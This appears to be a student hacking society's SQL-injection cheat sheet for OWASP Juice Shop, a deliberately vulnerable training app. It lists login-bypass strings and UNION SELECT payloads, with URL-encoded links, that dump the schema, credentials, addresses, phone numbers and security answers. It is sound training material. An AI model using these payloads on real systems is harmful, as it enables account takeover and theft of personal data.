**Tags:**
- #SQLi
- #Cheatsheet 

**Category:**
- #Web-Exploitation

---


# Disclaimer

All scripts developed for educational purposes during sessions with Sheffield Ethical Student Hackers Society, and executed on OWASP's dedicated Juice Shop training platform. Do not execute these scripts unless you have explicit permission. SESH Code of Conduct can be found [here](https://shefesh.com/downloads/SESH%20Code%20of%20Conduct.pdf).

# Logging In

All following statements to be pasted into the 'username' field in the login form, with any arbitrary password.

**Basic SQL Injection for logging in as the first user in the database**

`' OR 1=1;--`

**Log in as a user with an email similar to 'jim'**

`' OR 1=1 AND email LIKE('%jim%');--`

**Log in as a user that does not exist in the database**

`' UNION SELECT * FROM (SELECT 200 as 'id', 'chad' as 'username', 'chadd@juice-sh.op' as 'email', 'chadd' as 'password', 'admin' as 'role', '' as 'deluxeToken' , '1.3.3.7' as 'lastLoginIp' , 'assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--`

# Data Exfiltration

These scripts executed by a call to exposed `/rest/products/search` API - SQL statements illustrated for clarity, but scripts best executed by visiting the URL directly.

## Stealing the Schema

SQL Statement:

`qwert')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--`

Test it at the following URL:

https://juice-shop.herokuapp.com/rest/products/search?q=qwert%27))%20UNION%20SELECT%20sql,%20%272%27,%20%273%27,%20%274%27,%20%275%27,%20%276%27,%20%277%27,%20%278%27,%20%279%27%20FROM%20sqlite_master--

## Stealing emails and passwords

SQL Statement:

`qwert')) UNION SELECT email, password, '3', '4', '5', '6', '7', '8', '9' FROM Users--`

Test it at the following URL:

https://juice-shop.herokuapp.com/rest/products/search?q=qwert%27))%20UNION%20SELECT%20email,%20password,%20%273%27,%20%274%27,%20%275%27,%20%276%27,%20%277%27,%20%278%27,%20%279%27%20FROM%20Users--

## Stealing names, addresses, and mobile numbers

SQL Statement:

`qwert')) UNION SELECT fullName, streetAddress, city, country, mobileNum, '6', '7', '8', '9' FROM Addresses--`

Test it at the following URL:

https://juice-shop.herokuapp.com/rest/products/search?q=qwert%27))%20UNION%20SELECT%20fullName,%20streetAddress,%20%27city%27,%20%27country%27,%20%27mobileNum%27,%20%276%27,%20%277%27,%20%278%27,%20%279%27%20FROM%20Addresses--

## Stealing captcha questions and answers

SQL Statement:

`qwert')) UNION SELECT captcha, answer, '3', '4', '5', '6', '7', '8', '9' FROM Captchas--`

Test it at the following URL:

https://juice-shop.herokuapp.com/rest/products/search?q=qwert%27))%20UNION%20SELECT%20captcha,%20answer,%20%273%27,%20%274%27,%20%275%27,%20%276%27,%20%277%27,%20%278%27,%20%279%27%20FROM%20Captchas--

## Stealing security questions and answers

SQL Statement:

`qwert')) UNION SELECT q.question, a.answer, a.UserID, '4', '5', '6', '7', '8', '9' FROM SecurityQuestions q INNER JOIN SecurityAnswers a ON q.id = a.id--`

Test it at the following URL:

https://juice-shop.herokuapp.com/rest/products/search?q=qwert%27))%20UNION%20SELECT%20q.question,%20a.answer,%20a.UserID,%20%274%27,%20%275%27,%20%276%27,%20%277%27,%20%278%27,%20%279%27%20FROM%20SecurityQuestions%20q%20INNER%20JOIN%20SecurityAnswers%20a%20ON%20q.id%20=%20a.id--